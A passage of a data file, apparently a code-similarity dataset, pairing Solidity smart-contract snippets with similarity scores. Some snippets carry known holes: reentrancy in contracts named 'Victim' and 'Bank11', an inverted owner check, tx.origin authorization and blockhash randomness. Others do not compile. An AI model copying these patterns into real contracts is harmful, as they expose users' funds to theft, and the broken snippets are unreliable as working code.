        Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= balances[_from].sub(locknum[_from]));
        require(_amount <= allowed[_from][msg.sender]);
        
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}"
"contract Recorder{
  event Record(
    address _from,
    string _message,
    uint _cash
  );

  function record(string message) public payable {
    Record(msg.sender,message,msg.value);
  }

  function () public payable {} 
}",0.6983589448143261,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract HelloWorld{

    address public owner;
    address public helloAddress;

    function HelloWorld (address _helloAddress) public {
        owner = msg.sender;
        helloAddress = _helloAddress;
    }

}",0.6332900659074094,"contract HasWallet is Ownable {
    address public wallet;

    function setWallet(address walletAddress) public onlyOwner {
        require(walletAddress != address(0));
        wallet = walletAddress;
    }


}"
"contract NewHello{ 

    address owner;
    address newOwner;

    constructor()public{
        owner = msg.sender;
    }

    modifier onlyOwner (){
        if(msg.sender != owner){
            require(msg.sender == newOwner);
            _;
        }
        else{
            require(msg.sender == owner);
            _;
        }

    }

    struct user{
        string name;
        string surname;
        uint age;
    }
     event infoChanged(
        string name,
        string surname,
        uint age
    );

    mapping(address => user) public users; 

    function setUser(string memory name,string memory surname,uint age) public payable{
        users[msg.sender] = user(name,surname,age);
        emit infoChanged(name,surname,age);
    }
    function setUserbyAdmin(address _address, string memory name,string memory surname,uint age) public payable onlyOwner{
        users[msg.sender] = user(name,surname,age);
        emit infoChanged(name,surname,age);
    }

    function getUser(address _address) public view returns(string memory name , string memory surname, uint age)  {

        return (users[_address].name,users[_address].surname,users[_address].age);        
    }
}",0.6316138698079351,"contract Ownable {

  address public owner;

  address public coinvest;

  mapping (address => bool) public admins;



  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



  

  constructor() public {

    owner = msg.sender;

    coinvest = msg.sender;

    admins[owner] = true;

    admins[coinvest] = true;

  }



  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }



  modifier coinvestOrOwner() {

      require(msg.sender == coinvest || msg.sender == owner);

      _;

  }



  modifier onlyAdmin() {

      require(admins[msg.sender]);

      _;

  }



  

  function transferOwnership(address newOwner) onlyOwner public {

    require(newOwner != address(0));

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }

  

  

  function transferCoinvest(address _newCoinvest) 

    external

    onlyOwner

  {

    require(_newCoinvest != address(0));

    coinvest = _newCoinvest;

  }



  

  function alterAdmin(address _user, bool _status)

    external

    onlyOwner

  {

    require(_user != address(0));

    require(_user != coinvest);

    admins[_user] = _status;

  }



}"
"contract project{

    address public user;
    bytes32[10] name;
    address[10] customer;
    uint public i=0;
    function project(){
        user=msg.sender;
    }



    function add(bytes32 _name){
        name[i]=_name;
        customer[i]=msg.sender;
        i++;
    }

    function get_address() constant returns(address[10]){
        return customer;
    }

    function reward() {
        for(uint i=0;i<10;i++)
        {
            customer[i].send(1);
        }

    }

}",0.6291194896072337,"contract ReverseRegistrar {
    function setName(string memory name) public returns (bytes32 node);
    function claim(address owner) public returns (bytes32 node);
    function claimWithResolver(address owner, address resolver) public returns (bytes32 node);
    function node(address addr) public pure returns (bytes32);
}"
"contract UserRegistration
{
    function getUserCount() public returns(uint);
    function getUser(uint) public returns(uint,string,string,uint,uint);
}",0.6603136499370877,"contract ERC20PriceInterface {

    function getPrice() public view returns(uint);

    function getETHBalance() public view returns(uint);

}"
"contract Exam
{
    address private addrUsr;
    uint public count;
    UserRegistration r;
    constructor(address _addrUsr)
    {
        addrUsr=_addrUsr;
        r = UserRegistration(addrUsr);
    }

    function updateCount() public {

        count=r.getUserCount();
    }

    function getUserData(uint _id) public
    {
        
    }       

}",0.6030144786604292,"contract OtcLike {
    function sellAllAmount(address, uint, address, uint) public returns (uint);
    function buyAllAmount(address, uint, address, uint) public returns (uint);
    function getPayAmount(address, address, uint) public returns (uint);
}"
"contract SplitBalance{

    address a1;
    address a2;
    uint account1;
    uint account2;

    function SplitBalance(address _a1, address _a2) public{
        a1 = _a1;
        a2 = _a2;
    }

    function withdraw(address _addr) public {
        if (_addr == a1)   
        {
            account1 = 0;
            a1.transfer(account1);
        }
        else if (_addr == a2)   
        {
            account2 = 0;
            a2.transfer(account2);
        }
    }

    function updateAddress1(address newAddress) public {
        if(msg.sender != a1)
           revert();
        a1 = newAddress;
    }

    function updateAddress2(address newAddress) public {
        if(msg.sender != a2)
           revert();
        a2 = newAddress;
    }

    function() payable public { 
        uint amount = msg.value/2;
        account1 = account1 + amount;
        account2 = account2 + amount;
    }
}",0.6294859992020776,"contract ERC20 {

  uint256 public totalSupply;

  function balanceOf(address _owner) public constant returns (uint256);
  function transfer(address _to, uint256 _value) public returns (bool);
  function transferFrom(address _from, address _to, uint256 _amount) public returns (bool);
  function approve(address _spender, uint256 _amount) public returns (bool);
  function allowance(address _owner, address _spender) public constant returns (uint256);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

}"
"contract PenContract{

    struct Pen{
        uint productCode;
        address ownerAddress;
    }

    address public owner;
    Pen public _pen;

    
    address[] public __history;


    constructor (uint _productCode, address _ownerAddress) public{
        owner = msg.sender;
        _pen.productCode = _productCode;
        _pen.ownerAddress = _ownerAddress;

        
        __history.push(_ownerAddress);
    }


    function exchangePen(address _buyer) public returns (bool) {
        _pen.ownerAddress = _buyer;
        __history.push(_buyer);
        return true;            
    }

    function getHistoryForPen() public view returns (address[]) {
        return __history;
    }
}",0.6341674612987849,"contract Deployer {
  address owner;
  address factory;

  function Deployer(address _factory) public {
    factory = _factory;
    owner = msg.sender;
  }

  function newContract(address _party, address user_contract, uint _start_date) public returns (address created) {
    require(msg.sender == factory);
    address new_contract = new TokenToTokenSwap(factory, _party, user_contract, _start_date);
    return new_contract;
  }

   function setVars(address _factory, address _owner) public {
    require (msg.sender == owner);
    factory = _factory;
    owner = _owner;
  }
}"
"contract A{
    function double(uint a)external returns (uint res);
    struct St{
    uint val;
   }
 }",0.6762885022208509,"contract Jewel {

    function incise(address owner, uint256 value) external returns (uint);

}"
"contract Calculator{
   int private lastValue =0;
   function Add(int a, int b) public returns (int){
      lastValue = a+ b;
      return lastValue;
   }
   function Subtract(int a, int b) public returns (int) {
      lastValue = a-b;
      return lastValue;
    }
    function LastOperation()public constant returns (int) {
       return lastValue;
    }
 }",0.6542375313846718,"contract SafeMathLib {
  function safeMul(uint a, uint b) returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function safeSub(uint a, uint b) returns (uint) {
    assert(b <= a);
    return a - b;
  }

  function safeAdd(uint a, uint b) returns (uint) {
    uint c = a + b;
    assert(c>=a);
    return c;
  }
}"
"contract TrafficFine{
        function addOfficer(string firstName,string lastName,address officer) public;
        function getOfficer(address officer) public view returns (address);

    }",0.679027424625502,"contract MiningKingInterface {
    function getKing() public returns (address);
    function transferKing(address newKing) public;

    event TransferKing(address from, address to);
}"
"contract A{

    event Payment(address recipient, uint value);
    event Receive(address sender, uint value);

    address sender;
    address payable receiver;
    uint sentValue;
    uint receiptValue;
    uint gasPrice;

    function pay(address payable recipient) external payable{\\Transfers some ether to B
        recipient.transfer(msg.value);
        B(recipient).cash(msg.value, tx.gasprice);
        receiver=recipient;
        sentValue=msg.value;
        gasPrice=tx.gasprice;
        emit Payment(recipient, msg.value);
    }

    function payView() public view returns(address, string memory, string memory, string memory){\\Shows some data about the last transfer.
        return (receiver, uint2str(sentValue), uint2str(gasPrice), uint2str(address(this).balance));
    }

    function cash(uint cashValue, uint GasPrice) external payable{\\Records some data about the last received transaction
        sender=msg.sender;
        receiptValue=cashValue;
        gasPrice=GasPrice;
        emit Receive(msg.sender, cashValue);
    }

    function cashView() public view returns(address, string memory, string memory, string memory){\\Shows some data about the last received transaction
        return (sender, uint2str(receiptValue), uint2str(gasPrice), uint2str(address(this).balance));
    }

    function uint2str(uint _i) internal pure returns (string memory ) {
        if (_i == 0) {
                return ""0"";
         }
        uint j = _i;
        uint len;
        while (j != 0) {
                len++;
              j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
             bstr[k--] = byte(uint8(48 + _i % 10));
             _i /= 10;
         }
        return string(bstr);
    }

    function() external payable{}

}",0.6892960887714352,"contract AnonymousWALL {

    

    address payable manager;

    struct messageDetails {

      uint time;

      string headline ;

      string message;

    }

    mapping (address => messageDetails) journal;

    address[] private listofjournalists;

    

    constructor() public {

      manager = msg.sender;

    }

    

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {

        if (_i == 0) {

            return ""0"";

        }

        uint j = _i;

        uint len;

        while (j != 0) {

            len++;

            j /= 10;

        }

        bytes memory bstr = new bytes(len);

        uint k = len - 1;

        while (_i != 0) {

            bstr[k--] = byte(uint8(48 + _i % 10));

            _i /= 10;

        }

        return string(bstr);

    }

    

    function enteranews(string memory uHeadline, string memory uMessage) public payable {

        require(msg.value >= .001 ether,""This contrat works with minimum 0.001 ether"");

        require(journal[msg.sender].time == 0,""An account can only be used once."");

        manager.transfer(msg.value);

        journal[msg.sender].time = now;

        journal[msg.sender].headline = uHeadline;

        journal[msg.sender].message = uMessage;

        listofjournalists.push(msg.sender) -1;

    }

    

    function getjournalists() view public returns(address[] memory) {

      return listofjournalists;

    }

    

    function numberofnews() view public returns (uint) {

      return listofjournalists.length;

    }

    

    function gamessage(address _address) view public returns (string memory, string memory, string memory,string memory) {

        if(journal[_address].time == 0){

            return (""0"", ""0"", ""0"", ""This address hasnt sent any messages before."");

        } else {

            return (uint2str(journal[_address].time), journal[_address].headline, journal[_address].message, ""We reached your message successfully."");

        }

    }

}"
"contract Abc{
    string[] st;

    function add(string memory newValue) public {
        st.push(newValue);
    }

    ",0.6329480024288691,"contract Agency {
    function register(string memory _input) public pure returns(bytes32);
}"
"contract DappTokenSale{
    address admin;
    DappToken public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

    constructor(DappToken _tokenContract, uint256 _tokenPrice) public {
        
        admin = msg.sender;
        
        tokenContract = _tokenContract;
        
        tokenPrice = _tokenPrice;
    }
    
    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }
    
    function buyTokens(uint256 _numberOfTokens) public payable{
        
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        
        require(tokenContract.balanceOf(address(this)) >= _numberOfTokens);    
        
        require(tokenContract.transfer(msg.sender,_numberOfTokens));
        
        tokensSold += _numberOfTokens;

        
        emit Sell(msg.sender, _numberOfTokens);
    }

    
    function endSale() public {
        
        require(msg.sender == admin);
        
        require(tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));
        
        
        
        
        
        
        selfdestruct(admin);
    }
}",0.6018311376008165,"contract TokenMaker is Ownable {

    uint public fee_in_dc_units = 10e18;

    address public dc_token_address;

    token dcToken;

    mapping (address => address[]) public myTokens;





    function setFee(uint number_of_dc_uints) public onlyOwner {

        fee_in_dc_units = number_of_dc_uints;

    }



    function setDcTokenAddress(address _addr) public onlyOwner {

      dc_token_address = _addr;

      dcToken = token(_addr);

    }



    function makeToken(string memory _name, string memory _symbol, uint _totalSupply, uint _decimals) public {

        require(dcToken.transferFrom(msg.sender, address(this), fee_in_dc_units));



        ERC20Token newToken = new ERC20Token(msg.sender, _name, _symbol, _totalSupply, _decimals);

        myTokens[msg.sender].push(address(newToken));



    }



    function getMyTokens() public view returns (address[] memory) {

      return myTokens[msg.sender];

    }



    function withdrawTokens() public onlyOwner {

      dcToken.transfer(msg.sender, dcToken.balanceOf(address(this)));

    }

}"
"contract mypool{
    address public manager;
    string poolname;
    uint256 poolEndDate;
    uint256 poolAmount;

    constructor () public {
        manager = msg.sender;
    }

    struct Payer {
        string name;
        address player;
        uint256 amount;
    }

    Payer[] public players;

    function enterPoolInfo(string name,uint256 endDate, uint256 amount) public {
        poolname = name;
        poolEndDate = endDate;
        poolAmount = amount;
    }

    function enter(string name,uint256 amount) public payable {
        require(msg.value > .01 ether);

        Payer memory m;
        
        m.player = msg.sender;
        m.amount = amount;
        m.name = name;
        players.push(m);
    }

}",0.6293362437110885,"contract Asset is Mew

{

    address public owner;

    mapping ( address => uint256 ) public assetIn;

    uint256 public minDeposit;

    function() external payable { }

    function initAsset(uint256 min) public payable {

        if (min > minDeposit && msg.value >= min) {

            owner = msg.sender;

            minDeposit = min;

            deposit();

        } else revert();

    }

    function deposit() public payable {

        if (msg.value >= minDeposit) {

            assetIn[msg.sender] += msg.value;

        }

    }

    function withdraw(uint256 amount) public {

        uint256 max = assetIn[msg.sender];

        if (max > 0 && amount <= max) {

            assetIn[msg.sender] -= amount;

            msg.sender.transfer(amount);

        }

    }

}"
"contract E{
    address public sender;
    uint public x;

    function set(uint _x) {
        x = _x;
        sender = msg.sender;
    }

    function get() constant returns(uint) {
        sender = msg.sender;
        return x;
    }
}",0.6484966230337653,"contract Token {

    function transfer(address to, uint tokens) public returns (bool success);



    function balanceOf(address tokenOwner) public constant returns (uint balance);

}"
"contract transfer{

  mapping(uint => address[]) public owners;

  function createAsset(string name, uint price) public
  {
      uint id = getRandom(); 

      Asset memory newAsset = Asset(name, price); 

      owners[id].push(msg.sender);

    }

  function transferProduct(uint id) public payable {
    owners[id].push(address((msg.sender)));

  }
}",0.6378159768358854,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract Sample{

    event Data(uint test) ; 

    function test2() {
        Data(msg.gas) ;
    }
}",0.630683400873047,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract Victim{


  function donate() public payable 
  {
    credit[msg.sender] += msg.value;
  }


  function withdraw(uint amount) public {

    if (credit[msg.sender] >= amount)
    {
      (bool success, ) = msg.sender.call.value(amount)("""");
      require(success);
      credit[msg.sender] -= amount;
    }
  }

}",0.6366185107595198,"contract X2_FLASH  
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function X2()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}"
"contract Hotelbooking{

    address receiver;
    function deposit(uint256 _amount) payable public {
        require(msg.value == _amount);
        
    }

    function Execution (address _Address, uint _Amount) {
           receiver = _Address;
           receiver.transfer(_Amount);
       }
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}",0.6884771638487297,"contract Merunas {

    address payable public owner = msg.sender;

    

    function () external {}

    function receiveDonation() public payable {}

    function extractFunds() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    function showBalance() public view returns(uint256) {

        return address(this).balance;

    }

}"
"contract Victim{
    
       function  withdraw() public{
          
          uint transferAmt = 1 ether;
          (bool success, ) = msg.sender.call.value(transferAmt)("""");
          
       }
       function deposit() payable public {}
    }",0.6867372083569476,"contract IEmPool {
   function deposit() public payable;
   function withdraw(uint256 _value) external;
   function withdrawTo(address _to, uint256 _value) public;
}"
"contract MKotET1_1{

    address payable king; uint public claimPrice = 100;

    function calculateCompensation() public returns(uint) {
    }

    function( ) external payable {
       if (msg.value  < claimPrice) revert();
           uint compensation = calculateCompensation();
           if(!king.call.value(compensation)("""")) revert();
          king = msg.sender;
       }
    }",0.6398874352468524,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract CustodialContract{

    address client;
    bool public _switch = false;

    event UpdateStatus(string _msg);
    event UserStatus(string _msg, address user, uint amount);

    function CustodialContract(){
        client = msg.sender;
}

    modifier IfClient(){
        if(msg.sender !=client){
            revert();
    }
    _;
}

    function depositFunds() payable{
        emit UserStatus('User has deposited money!', msg.sender, msg.value);

}

    function withdrawFunds(uint amount) IfClient{
        if(client.send(amount)){
            emit UpdateStatus('User has transferred some money!');
            _switch=true;
    }
        else{
            _switch = false ;
    }
}

    function getFunds() constant returns(uint) {
        emit UpdateStatus('Someone called a getter!');
        return address(this).balance;
}",0.6538841183102666,"contract WithdrawalContract {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function WithdrawalContract () payable {
        richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = msg.sender;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        
        
        
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}"
"contract Try{

    uint public num;

    function changeNum(uint _num){
        num = _num;
    }

    function cool(uint _num) constant {
        if (_num > 5){
            changeNum(_num + 2);
        }
    }
}",0.6688680994076145,"contract test {
  using SafeMath for uint256;
  uint256 public num;
  function test() {
    num = 10;
  }
  function add(uint256 _num) {
    num = num.add(_num);
  }
}"
"contract ApprovalContract
{
    address public sender;
    address public receiver;
    address public constant approver = 0x6af7A9CFe4D4B938Ff4038Fd0625d18C5D671834;


function deposit(address payable _receiver) external payable{
    require(msg.value>0);
    sender = msg.sender;
    receiver = _receiver;
    }

    function viewApprover() external pure   returns(address)
        {
            return(approver);
        }

    function approve() external {
        require(msg.sender ==  approver);
        receiver.transfer(address(this).balance);
    }
}",0.6274558626142586,"contract Interacting {

    address private owner = msg.sender;

    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    

    function sendEther(address _to) external payable onlyOwner {

        require(_to.call.value(msg.value)(''));

    }

    

    function callMethod(address _contract, bytes _extraData) external payable onlyOwner {

        require(_contract.call.value(msg.value)(_extraData));

    }

    

    function withdrawEther(address _to) external onlyOwner {

        _to.transfer(address(this).balance);

    }

    

    function () external payable {

        

    }

}"
"contract Test{

    address payable owner;
    address payable buyerAddr;
    address payable withdrawAddr;

    mapping(address => uint) balances;

    constructor(address payable _buyerAddr, address payable _withdrawAddr) payable public {
        owner = msg.sender;
        buyerAddr = _buyerAddr;
        withdrawAddr = _withdrawAddr;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    modifier onlyBuyer(){
        require(msg.sender == buyerAddr);
        _;
    }

    function Send() payable public onlyBuyer{
        owner.transfer(msg.value);
    }

    function getBalanceOwner() view public returns(uint){
        return owner.balance;
    }

    function getBalanceBuyer() view public returns(uint){
        return buyerAddr.balance;
    }

    function getBalanceWithdrawAddr() view public returns(uint){
        return withdrawAddr.balance;
    }

    function getBalanceThis() view public returns(uint){
        return address(this).balance;
    }

    function Withdraw() onlyOwner public returns(bool success)  {
        uint wd = 5 ether;
        withdrawAddr.transfer(wd);
        return true;
    }



}",0.67031807607864,"contract EthMash {

    address public owner;
    mapping (address => uint) public balances;

    address public leader;

    event Log(address challenger, address defender, bool success);

    constructor() public {
        owner = msg.sender;
        leader = owner;
    }

    function publicGetBalance(address player) view public returns (uint) {
        return balances[player];
    }

    function publicGetState() view public returns (address) {
        return leader;
    }

    function userWithdraw() public {
        require(balances[msg.sender] > 0);
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(amount);
    }

    function userChallenge() public payable {
        require(msg.value == 100 finney);
        
        uint random = (uint(blockhash(block.number - 1)) + uint(leader) + uint(msg.sender));
        if (random % 2 == 1) {
            emit Log(msg.sender, leader, true);
            balances[msg.sender] += 100 finney;
            leader = msg.sender;
        } else {
            emit Log(msg.sender, leader, false);
            balances[leader] += 95 finney;
            balances[owner] += 5 finney;
        }
    }
}"
"contract MyContract
{
    string sentence = ""my first sentence"" ;
    address owner ;
    function MyContract()
    {
        owner = msg.sender ;

    }
    function getSentence() public constant returns(string)     {
        return sentence ;
    }
        function setSentence(string newsentence) public returns (string)
        {
            if(owner!= msg.sender)
            {
                return ""don't dare to change the contract"" ;
            }
            sentence = newsentence ;
            return sentence ;

        }
        uint balance=100 ;
        uint value ;
        function Transact(uint value) public returns(uint)
        {
            assert(value % 10 == 0) ;
            require(value<= balance) ;
            balance = balance - value ;
            return balance ;
        }

}",0.6679964169822293,"contract BasicToken is ERC20Interface{

    using SafeMath for uint256;

    

    

    



    mapping (address => uint256) balances;





    uint totalSupply_;





  function totalSupply() public view returns (uint){

    return totalSupply_;

  }



  function transfer(address _to, uint _value) public returns (bool){

    require (_to != address(0));

    

    

    require (_value <= balances[msg.sender]);

    



    balances[msg.sender] = balances[msg.sender].sub(_value);

    

    balances[_to] = balances[_to].add(_value);

    



    emit Transfer(msg.sender,_to,_value);

    

    return true; 



  }



  function balanceOf(address _owner) public view returns(uint balance){

    return balances[_owner];

  }



}"
"contract HealthcareLogic{

  mapping (address => uint8) public userData;


  function writeData(uint8 _age) public returns (bool) {
    userData[msg.sender] = _age;

    return true;
  }

}",0.6610440926591488,"contract BattleInterface {
    function addWarrior(address, uint, uint8, string) pure public returns (bool) {}
    function isDead(uint) public pure returns (bool) {}
}"
"contract CallMe
{
    event UserRegistered(address indexed _from, string _attr);

    address public minter;     

    modifier onlyOwner {
        if (msg.sender != minter)
            throw;
        _;
    }

    function CallMe() {
        minter = msg.sender;
    }

    function() { 
        throw;
    }

    function registrationRequest(address _toAdd, string _code) {

        
        
        UserRegistered(_toAdd, _code);
    }


    function getMinter() constant returns (address) {
        return minter;
    }
}",0.6414252746914737,"contract Certifier {
	event Confirmed(address indexed who);
	event Revoked(address indexed who);
	function certified(address) public constant returns (bool);
	function get(address, string) public constant returns (bytes32);
	function getAddress(address, string) public constant returns (address);
	function getUint(address, string) public constant returns (uint);
}"
"contract HashEventTest{
    bytes public hash;

    event IpfsHash(
        bytes ipfs_hash,
        address sender
     );

    function HashEventTest(bytes _hash) public {
        hash = _hash;
    }

    function setHash(bytes _hash) public {
        hash = _hash;
        emit IpfsHash(hash, msg.sender);
    }

    function getHash() public constant returns (bytes){
        return hash;
    }
}",0.638111849292587,"contract EthAvatar {
    mapping (address => string) private ipfsHashes;

    event DidSetIPFSHash(address indexed hashAddress, string hash);


    function setIPFSHash(string hash) public {
        ipfsHashes[msg.sender] = hash;

        DidSetIPFSHash(msg.sender, hash);
    }

    function getIPFSHash() public view returns (string) {
        return ipfsHashes[msg.sender];
    }
}"
"contract Cars{
   struct Car{
      bytes32 make;
      unint year;
   }

   mapping(address => Car[]) public carOwners;

   function registerCar(bytes32 _make, uint r) public {
      carOwners[msg.sender].push(Car({ make: _make,
                                       year: yr}));
   }
   function changeOwnership(address toOwner, uint index) public returns (bool){
      if(carOwners[msg.sender].length == 0) {
         return false;
      }
      if(carOwners[msg.sender].length > index + 1) {
         return false;
      }
      carOwners[toOwner].push(carOwners[msg.sender][index]);
    }
    function getCarMake(address owner, uint index) public view returns (bytes32 carMake) {
       if(carOwners[owner].length == 0) {
          return;
       }
       if(carOwners[owner].length > index + 1){
          return;
       }
       carMake = carOwners[owner][index].make;
     }
}",0.6127096679633234,"contract Owned {
    
    address public owner;
    mapping(address => bool) public owners;

    function Owned() public {
        owner = msg.sender;
        owners[msg.sender] = true;
    }

    modifier onlyOwners{
        address sen = msg.sender;
        require(owners[msg.sender] == true);
        _;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    modifier onlyOwnerOrigin{
        require(tx.origin == owner);
        _;
    }

    function addOwner(address newOwner) public onlyOwners{
        owners[newOwner] = true;
    }

    function removeOwner() public onlyOwners{
        owners[msg.sender] = false;
    }

    function removeOwner(address newOwner) public onlyOwner{
        owners[newOwner] = false;
    }

    function isOwner(address o) public view returns(bool){
        return owners[o] == true;
    }
}"
"contract TestConst{
    uint public a = 10;

    function constantFnA() constant returns (uint) {
        return  a+5;
    }

    
    
    function const_NonConst_A(){ 
        a = constantFnA();
    }

    
    

    function nonConst_A(){
        a = a+5;
    }

    uint8 public b = 10;

    
    
    function constantFnB() constant returns (uint8) {
        return  b+5;
    }

    
    
    function const_NonConst_B(){
        b = b+5;
    }

    function nonConst_B(){
        b = constantFnB();
    }  
}",0.6236362134536195,"contract DateTime {

		function toTimestamp(uint16 year, uint8 month, uint8 day) public constant returns (uint timestamp);

        function getYear(uint timestamp) public constant returns (uint16);

        function getMonth(uint timestamp) public constant returns (uint8);

        function getDay(uint timestamp) public constant returns (uint8);

}"
"contract foo{

    bytes32[] bar;

    function set(bytes32 _foo) {
        bar.push(_foo);
    }
}",0.6415688347077982,"contract P4PState {
    
    function addGames(bytes32[] states, bytes32[] boards) {}
}"
"contract Simple{

    uint256 data;
    string male;
    string name;
    string id;
    function getdata() view public returns(uint256) {
        return data;
    }

    function setdata (uint256 _data) public{
        data= _data;
    }

    function getinfo() view public returns(string memory, string memory, string memory) {
        return (id,male,name);
    }

    function setinfo (string memory _id, string memory _male, string memory _name) public{
        id= _id;
        male= _male;
        name= _name;
    }
}",0.6822550813481724,"contract modERC20Detailed is modIERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor (string name, string symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    

    function name() public view returns (string) {

        return _name;

    }



    

    function symbol() public view returns (string) {

        return _symbol;

    }



    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

}"
"contract TradeCenter is ERC223ReceivingContract{


    struct Rec{
        address from;
        uint tokens;
        bytes data;

    }

    mapping(address => uint) private _indexRec;
    mapping(uint => Rec) private _recs;
    uint private _index = 0;

    function tokenFallback(address _from, uint _value, bytes _data) public {

        _recs[_index] = Rec(_from,_value,_data);
        _indexRec[_from] = _index;
        _index++;


    }

    function getAddress() public view returns(address){

        Rec memory _rec = _recs[_indexRec[msg.sender]];

        return _rec.from;



    }




}",0.6695202239476911,"contract IERC223 {
    uint public totalSupply;
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public returns (bool success);
    function transfer(address to, uint value, bytes memory data) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint value, bytes data);
    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract Bank11{
   mapping(address=>uint) userBalances;
   function getUserBalance(address user) constant returns(uint) {
     return userBalances[user];
   }

   function addToBalance() payable {
     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
   }
   function withdrawBalance() {
     uint amountToWithdraw = userBalances[msg.sender];
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         throw;
     }
     userBalances[msg.sender] = 0;
   }
}",0.6298925402946641,"contract BasicToken is ERC20Basic {

  

  using SafeMath for uint;

  

  mapping(address => uint) balances;



  function transfer(address _to, uint _value) public{

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

  }



  function balanceOf(address _owner) public constant returns (uint balance) {

    return balances[_owner];

  }

}"
"contract Weechain is Ownable{

  using SafeMath for uint256;

  uint256 public energyTotalSupply;
  uint256 public powerTotalSupply;

  struct Device {
    uint256 energyValue;
    uint256 powerValue;
  }
  mapping(address => Device) amount;

  event setEnergyEvent(address indexed device, uint256 energy); 
  event setPowerEvent(address indexed device, uint256 power);
  event setPayloadEvent(uint256 indexed SQN, string payload);

  
  function Weechain() {

    energyTotalSupply = 0;
    powerTotalSupply = 0;

    amount[owner].energyValue = energyTotalSupply;
    amount[owner].powerValue = powerTotalSupply;
  }

  function amountOfenergy(address dev) constant returns (uint256 energy) {
    return amount[dev].energyValue;
  }
  function amountOfpower(address dev) constant returns (uint256 power) {
    return amount[dev].powerValue;
  }

  function setPayload(uint256 SQN, string payload) public returns (bool) {

    emit setPayloadEvent(SQN, payload);

    return true;
  }

  function setEnergy(address dev, uint256 energy) public returns (bool) {
    require(dev != address(0));

    amount[dev].energyValue = amount[dev].energyValue + energy;
    energyTotalSupply = energyTotalSupply + energy;

    emit setEnergyEvent(dev, energy);

    return true;
  }

    function setPower(address dev, uint256 power) public returns (bool) {
    require(dev != address(0));

    amount[dev].powerValue = amount[dev].powerValue + power;
    powerTotalSupply = powerTotalSupply + power;

    emit setPowerEvent(dev, power);

    return true;
  }

}",0.6374354706634471,"contract StandarERC20 is ERC20{

  using SafeMath256 for uint256; 

     

     mapping (address => uint256) balance;

     mapping (address => mapping (address=>uint256)) allowed;





     uint256  totalSupply_; 

     

      event Transfer(address indexed from,address indexed to,uint256 value);

      event Approval(address indexed owner,address indexed spender,uint256 value);





    function totalSupply() public view returns (uint256){

      return totalSupply_;

    }



     function balanceOf(address _walletAddress) public view returns (uint256){

        return balance[_walletAddress]; 

     }





     function allowance(address _owner, address _spender) public view returns (uint256){

          return allowed[_owner][_spender];

        }



     function transfer(address _to, uint256 _value) public returns (bool){

        require(_value <= balance[msg.sender]);

        require(_to != address(0));



